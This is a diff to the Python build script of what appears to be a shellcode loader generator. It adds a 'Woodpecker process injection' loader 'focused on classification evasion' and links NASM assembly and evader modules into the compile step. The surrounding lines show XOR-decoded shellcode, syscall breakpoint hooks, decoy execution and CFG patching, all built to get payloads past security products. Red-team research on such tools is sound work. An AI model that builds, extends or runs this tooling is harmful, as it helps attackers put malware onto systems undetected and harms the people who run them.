@@ -506,6 +506,7 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
             unsigned char magiccode[dataSize];
             xorDecode(XORed, magiccode, dataSize, XORkey);
             printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
+            printf("[+] datasize : %lu bytes\\n", dataSize);
             """
         elif encoding == 'mac':
             encoding_declaration_index = content.find('const char* MAC[]')
@@ -863,6 +864,13 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
         except subprocess.CalledProcessError as e:
             print(f"[-] NASM compilation of '{asm_file}' failed: {e}")
             return
+    if loader_number in [50]:
+        try:
+            subprocess.run(['nasm', '-f', 'win64', 'woodpecker_assm.asm', '-o', 'assembly.o'], check=True)
+            print("[+] NASM assembly compilation successful.")
+        except subprocess.CalledProcessError as e:
+            print(f"[-] NASM assembly compilation failed: {e}")
+            return  # Exit the function if NASM compilation fails        
     if not output_name:
         raise ValueError("output_name is empty. Please provide a valid output name.")
     
@@ -985,13 +993,15 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
     if loader_number == 33: 
         compile_command.append('./syscall.c')
         compile_command.append('assembly.o')
-    if loader_number in [1, 29, 30, 34, 36, 39, 40, 41, 66]:
+    if loader_number in [1, 29, 30, 34, 36, 39, 40, 41, 50, 66]:
 
         compile_command.append('assembly.o')
         compile_command.append('-luuid')
-    if loader_number in [37, 38, 48, 49, 51, 52, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 76, 77]:
+    if loader_number in [37, 38, 48, 49, 50, 51, 52, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 76, 77]:
         compile_command.append('./evader/pebutils.c')
         # compile_command.append('-lole32')
+    # if loader_number == 50:  // for pretext code
+    #     compile_command.append('-lshlwapi')
     if cfg:
         compile_command.append('./evader/cfg_patch.c')
     ## add icon.res file to the compilation command
@@ -1302,6 +1312,7 @@ def main():
     41. Custom Stack PI (remote) with Decoy code execution
     48. Stealth new loader + Syscall breakpoints handler with memory guard AKA Sifu breakpoint handler (hook on NtResumeThread)
     49. Stealth new loader + Syscall breakpoints handler with memory guard evasion AKA Sifu breakpoint handler (hook on NtCreateThreadEx, with Decoy address, PAGE_NOACCESS and XOR)
+    50. Woodpecker process injection, tactics similar to Kenshin-ko.  Focused on classification evasion. 
     51. Stealth new loader + Syscall breakpoints handler with memory guard evasion AKA Sifu breakpoint handler (hook on ntdll!RtlUserThreadStart and kernel32!BaseThreadInitThunk, with Decoy address, PAGE_NOACCESS and XOR)
     52. RoP gadgets as the trampoline code to execute the magic code. 
     53.
